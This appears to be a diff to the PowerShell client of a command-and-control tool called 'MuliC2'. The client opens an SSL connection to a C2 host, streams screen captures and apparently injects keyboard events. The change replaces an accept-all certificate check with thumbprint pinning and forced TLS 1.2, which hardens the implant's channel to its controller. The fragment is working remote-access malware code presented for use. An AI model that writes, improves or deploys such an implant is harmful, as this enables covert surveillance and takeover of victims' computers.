@@ -311,6 +311,8 @@ function Invoke-KeyboardEvent {
     }
 }
 
+$expectedThumbprint = "YOUR_CERT_THUMBPRINT_HERE"  # <-- Replace with your actual cert thumbprint
+
 try {
     Write-Host "[*] Connecting to MuliC2 server at $C2Host`:$C2Port..." -ForegroundColor Cyan
     $global:tcpClient = New-Object System.Net.Sockets.TcpClient
@@ -321,29 +323,28 @@ try {
     }
     $global:tcpClient.EndConnect($asyncResult)
     Write-Host "[+] TCP connection established" -ForegroundColor Green
-    
-    $socket = $global:tcpClient.Client
-    $socket.ReceiveTimeout = 100  # Short timeout for non-blocking reads
-    $socket.SendTimeout = 30000
-    $socket.NoDelay = $true
-    
+    $tcpStream = $global:tcpClient.GetStream()
+    Write-Host "[*] Attempting SSL authentication..." -ForegroundColor Cyan
     $global:sslStream = New-Object System.Net.Security.SslStream(
-        $global:tcpClient.GetStream(),
+        $tcpStream,
         $false,
-        ([System.Net.Security.RemoteCertificateValidationCallback] { param($sender, $certificate, $chain, $sslPolicyErrors) return $true })
+        ([System.Net.Security.RemoteCertificateValidationCallback] {
+            param($sender, $certificate, $chain, $sslPolicyErrors)
+            if ($certificate -and $certificate.GetCertHashString() -eq $expectedThumbprint) {
+                return $true
+            }
+            Write-Host "[!] Certificate thumbprint mismatch: $($certificate.GetCertHashString())" -ForegroundColor Red
+            return $false
+        })
     )
-    
-    try {
-        $global:sslStream.AuthenticateAsClient($C2Host)
-    } catch {
-        throw "SSL authentication failed: $($_.Exception.Message)"
-    }
-    
-    if (-not $global:sslStream.IsAuthenticated) {
+    $global:sslStream.AuthenticateAsClient($C2Host, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
+    if ($global:sslStream.IsAuthenticated) {
+        Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
+        $stream = $global:sslStream
+    } else {
         throw "SSL authentication failed - stream not authenticated"
     }
     
-    Write-Host "[+] SSL connection established and authenticated" -ForegroundColor Green
     Write-Host "[*] Starting screen capture... (Press CTRL+C to exit gracefully)" -ForegroundColor Cyan
     Write-Host "[*] Capturing 800x600 resolution at 5 FPS" -ForegroundColor Gray
 
@@ -465,8 +466,9 @@ try {
     }
 
 } catch {
-    Write-Host "[!] Connection error: $($_.Exception.Message)" -ForegroundColor Red
-    Write-Host "[!] Make sure the MuliC2 listener is running on $C2Host`:$C2Port" -ForegroundColor Red
+    Write-Host "[!] SSL/TLS connection failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[!] Make sure the MuliC2 listener is running with the correct certificate on $C2Host`:$C2Port" -ForegroundColor Red
+    exit 1
 } finally {
     Start-Cleanup
 }
